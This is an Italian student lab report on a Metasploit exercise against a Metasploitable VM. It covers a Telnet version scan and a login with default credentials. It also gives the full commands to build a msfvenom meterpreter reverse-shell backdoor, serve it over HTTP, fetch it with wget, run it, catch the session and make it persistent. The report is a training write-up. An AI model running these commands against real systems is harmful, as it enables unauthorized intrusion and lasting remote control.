# Consegna S7/L2 | Hacking con Metasploit

## 🎯 Obiettivo
L'obiettivo di questa esercitazione è stato esplorare e applicare tecniche di **ethical hacking** utilizzando **Metasploit Framework** per:
1. Identificare e analizzare il servizio **Telnet** tramite il modulo `telnet_version`.
2. Creare una **backdoor personalizzata** con **msfvenom**, compatibile con l'architettura a 32-bit, e trasferirla sul target per ottenere una sessione shell e, opzionalmente, renderla **persistente**.

Questa relazione è scritta in modo chiaro e scorrevole, con l'obiettivo di essere comprensibile anche per chi non ha familiarità con questi strumenti. 🚀

---

## 1. Analisi del servizio Telnet con Metasploit
### 🛠️ Strumenti utilizzati
- **Metasploit Framework (msf6)**
- **Kali Linux**
- **Metasploitable** (target)
- **Nmap** per la scansione delle porte

### 📋 Procedura
1. **Scansione delle porte aperte**: 
   Utilizzando **Nmap**, abbiamo individuato che il servizio **Telnet** è attivo sulla porta **23** del target:
   ```bash
   nmap -p 23 192.168.50.3
   ```
   Questo passaggio è fondamentale per identificare servizi potenzialmente vulnerabili.

2. **Identificazione della versione Telnet**:
   Abbiamo utilizzato il modulo **auxiliary/scanner/telnet/telnet_version** di Metasploit per identificare la versione del servizio Telnet esposto:
   
   ```bash
   msfconsole
   use auxiliary/scanner/telnet/telnet_version
   set RHOSTS 192.168.50.3
   run
   ```
   Questo modulo ci ha fornito informazioni dettagliate sulla versione del servizio Telnet, permettendoci di pianificare eventuali attacchi successivi.

3. **Accesso alla shell Telnet**:
   Utilizzando le credenziali di default del servizio Metasploitable (ad esempio `msfadmin:msfadmin`), abbiamo ottenuto una **shell interattiva** sul target.

---

## 2. Creazione e utilizzo della backdoor
### 🧰 Strumenti utilizzati
- **msfvenom**: Generazione del payload
- **Metasploit Framework**: Configurazione del listener
- **Python HTTP Server**: Trasferimento del file
- **wget**: Download sul target

### 🚀 Creazione della backdoor
Abbiamo scelto di utilizzare **msfvenom** per creare un payload **reverse shell**. La scelta è ricaduta su **linux/x86/meterpreter_reverse_tcp** per i seguenti motivi:
1. **Compatibilità**: Metasploitable gira su architettura a **32-bit** (x86), rendendo necessario generare un payload adatto.
2. **Meterpreter**: Consente un controllo avanzato della macchina target, offrendo più funzionalità rispetto a una semplice shell interattiva.

Il comando utilizzato per generare la backdoor è stato:
```bash
msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=192.168.50.2 LPORT=4444 -f elf -o backdoor_ftp.elf
```
- **`-p`**: Payload per Linux con connessione inversa.
- **`LHOST` e `LPORT`**: Indirizzo IP e porta per ricevere la connessione.
- **`-f elf`**: Formato ELF per sistemi Linux.
- **`-o`**: Nome del file di output.

### 📤 Trasferimento della backdoor
Per trasferire il file sul target, abbiamo usato un server HTTP semplice su Kali e **wget** su Metasploitable:

1. **Avvio del server HTTP su Kali**:
   ```bash
   python3 -m http.server 8080
   ```
2. **Download del file sul target**:
   ```bash
   cd /tmp
   wget http://192.168.50.2:8080/backdoor_ftp.elf
   ```

### 🔑 Esecuzione della backdoor
Dopo aver trasferito la backdoor sul target, abbiamo eseguito i seguenti passaggi:
1. **Permessi di esecuzione**:
   ```bash
   chmod +x backdoor_ftp.elf
   ```
2. **Avvio della backdoor**:
   ```bash
   ./backdoor_ftp.elf
   ```

### 📡 Configurazione del listener su Metasploit
Per ricevere la connessione inversa generata dalla backdoor, abbiamo configurato il listener con **multi/handler**:
```bash
msfconsole
use exploit/multi/handler
set payload linux/x86/meterpreter_reverse_tcp
set LHOST 192.168.50.2
set LPORT 4444
exploit
```

### 🎉 Risultato: Sessione Meterpreter
La backdoor ha stabilito con successo una connessione con la nostra macchina Kali, fornendoci una **sessione Meterpreter**. Da qui, abbiamo potuto:
- Navigare nel filesystem (`ls`, `cd`)
- Caricare e scaricare file (`upload`, `download`)
- Ottenere informazioni dettagliate sul sistema (`sysinfo`)
- Eseguire comandi avanzati direttamente sul target

### 🔒 Persistenza (facoltativa)
Per rendere la backdoor persistente sul target, abbiamo utilizzato il modulo **persistence** di Meterpreter:
```bash
run persistence -X -i 5 -p 4444 -r 192.168.50.2
```
- **`-X`**: Installa come servizio di sistema.
- **`-i`**: Intervallo di riconnessione (ogni 5 secondi).
- **`LPORT` e `LHOST`**: Configurazione del listener.

---

## 🏁 Conclusione
Questa esercitazione ha dimostrato come:
1. Identificare la versione di un servizio vulnerabile utilizzando **Metasploit**.
2. Creare una **backdoor personalizzata** compatibile con l'architettura della macchina target.
3. Stabilire una **sessione Meterpreter** per eseguire operazioni avanzate di post-exploitation.

La simulazione è un esempio concreto di **analisi, sfruttamento e consolidamento** dell'accesso a un sistema compromesso, evidenziando l'importanza di proteggere i servizi esposti. 

---

## 👨‍💻 Autore
**Sebastiano | Consegna S7/L2**

---

## ⚠️ Note
Questo documento è a scopo puramente educativo e dimostrativo per la sicurezza informatica. Ogni utilizzo improprio è severamente vietato. 🚨
